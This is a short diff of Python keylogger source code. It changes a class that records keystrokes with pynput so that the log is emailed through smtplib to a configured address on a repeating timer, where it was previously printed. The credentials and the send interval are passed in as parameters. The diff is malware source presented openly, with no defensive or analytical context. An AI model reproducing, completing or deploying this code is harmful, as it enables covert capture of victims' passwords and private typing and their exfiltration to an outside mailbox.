@@ -5,10 +5,14 @@ import pynput.keyboard # This library allows to monitor mouse clicks and keyboar
 import threading
 import smtplib
 
+
 class Keylogger:
 
-    def __init__(self):
-        self.log = ""
+    def __init__(self, interval, email, password):
+        self.log = "Keylogger started"
+        self.interval = interval
+        self.email = email
+        self.password = password
 
     def append_to_key(self, string):
         self.log = self.log + string
@@ -24,9 +28,9 @@ class Keylogger:
         self.append_to_key(current_key)
 
     def report(self):
-        print(self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
-        timer = threading.Timer(5, self.report)
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
 
     def send_mail(self, email, password, message):
